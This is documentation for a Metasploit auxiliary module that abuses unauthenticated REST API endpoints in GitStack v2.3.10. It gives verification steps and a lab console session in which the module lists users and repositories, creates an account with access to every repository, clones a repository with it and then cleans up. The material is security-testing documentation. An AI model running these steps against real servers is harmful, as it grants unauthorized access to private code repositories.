## Description

GitStack through v2.3.10 contains unauthenticated REST API endpoints that can be used to retrieve information about the application and make changes to it as well. This module generates requests to the vulnerable API endpoints. This module has been tested against GitStack v2.3.10.

## Vulnerable Application

The GitStack application provides REST API functionality to list application users, list application repositories, create application users, etc. Several of the application's REST API endpoints do not require authentication, which allows those with network-level access to the application to take advantage of these unprotected requests.

Application user accounts created through the REST API do not have access to the admin web interface, but the accounts can be added and removed from repositories using additional API requests.

## Actions

**LIST**

List application user accounts. 

Note: The account `everyone` is a default account.

**LIST_REPOS**

List application repositories.

**CREATE**

Create a user account and add the account to all available repositories.

**CLEANUP**

Remove the specified application user account from all available repositories and delete the application account.

## Verification Steps

- [ ] Install a vulnerable GitStack application
- [ ] Create a few application user accounts
- [ ] Create a few application repositories
- [ ] `./msfconsole`
- [ ] `use auxiliary/admin/http/gitstack_rest`
- [ ] `set rhost <rhost>`
- [ ] `run`
- [ ] Verify the application user list that is returned
- [ ] `set action LIST_REPOS`
- [ ] `run`
- [ ] Verify the repository list that is returned
- [ ] `set username <username>`
- [ ] `set password <password>`
- [ ] `set action CREATE`
- [ ] `run`
- [ ] On the application verify that the user has been created
- [ ] On the application verify that the user has access to the repositories
- [ ] `set action CLEANUP`
- [ ] `run`
- [ ] On the application verify that the user doesn't have access to the repositories
- [ ] On the application verify that the user has been deleted



## Scenarios

### GitStack v2.3.10 on Windows 7 SP1 x64

```
msfdev@simulator:~/git/metasploit-framework$ ./msfconsole -q -r test.rc 
[*] Processing test.rc for ERB directives.
resource (test.rc)> use auxiliary/admin/http/gitstack_rest
resource (test.rc)> set rhost 172.22.222.122
rhost => 172.22.222.122
resource (test.rc)> run
[*] User List:
[+] rick
[+] morty
[+] everyone
[*] Auxiliary module execution completed
resource (test.rc)> set action LIST_REPOS
action => LIST_REPOS
resource (test.rc)> run
[*] Repo List:
[+] brainalyzer
[+] c137
[*] Auxiliary module execution completed
resource (test.rc)> set action CREATE
action => CREATE
resource (test.rc)> run
[+] SUCCESS: msf:password
[+] User msf added to brainalyzer
[+] User msf added to c137
[*] Auxiliary module execution completed
resource (test.rc)> set action CLEANUP
action => CLEANUP
resource (test.rc)> run
[+] msf removed from brainalyzer
[+] msf removed from c137
[+] msf has been deleted
[*] Auxiliary module execution completed
```

After CREATE, but before CLEANUP, use git to clone the remote repositories.

```
msfdev@simulator:~/money-bugs$ git clone http://msf:password@172.22.222.122/brainalyzer.git
Cloning into 'brainalyzer'...
remote: Counting objects: 3, done.
Unpacking objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 0 (delta 0)
msfdev@simulator:~/money-bugs$ cd brainalyzer/ && ls
szechuan_sauce.md
```
